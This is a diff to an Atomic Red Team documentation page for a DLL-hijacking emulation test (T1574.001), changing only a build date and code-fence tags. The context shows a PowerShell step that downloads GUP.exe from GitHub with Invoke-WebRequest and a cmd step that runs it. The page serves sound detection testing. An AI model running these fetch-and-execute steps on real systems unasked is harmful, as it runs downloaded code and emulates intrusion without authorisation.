@@ -6,7 +6,7 @@ generated: "true"
 attack_technique_id: "T1574.001"
 attack_technique_name: "Hijack Execution Flow: DLL"
 source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1574.001/T1574.001.yaml"
-build_date: "2026-04-26 14:38:40"
+build_date: "2026-04-26 17:02:13"
 executor: "command_prompt"
 aliases:
   - "65526037-7079-44a9-bda1-2cb624838040"
@@ -58,13 +58,13 @@ Gup.exe binary must exist on disk at specified location (#{gup_executable})
 
 ### Prerequisite Check
 
-```text
+```powershell
 if (Test-Path "#{gup_executable}") {exit 0} else {exit 1}
 ```
 
 ### Get Prerequisite
 
-```text
+```powershell
 New-Item -Type Directory (split-path "#{gup_executable}") -ErrorAction ignore | Out-Null
 Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1574.001/bin/GUP.exe?raw=true" -OutFile "#{gup_executable}"
 ```
@@ -75,13 +75,13 @@ Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/blob/master/at
 
 ### Command
 
-```commandprompt
+```cmd
 "#{gup_executable}"
 ```
 
 ### Cleanup
 
-```commandprompt
+```cmd
 taskkill /F /IM #{process_name} >nul 2>&1
 ```
 
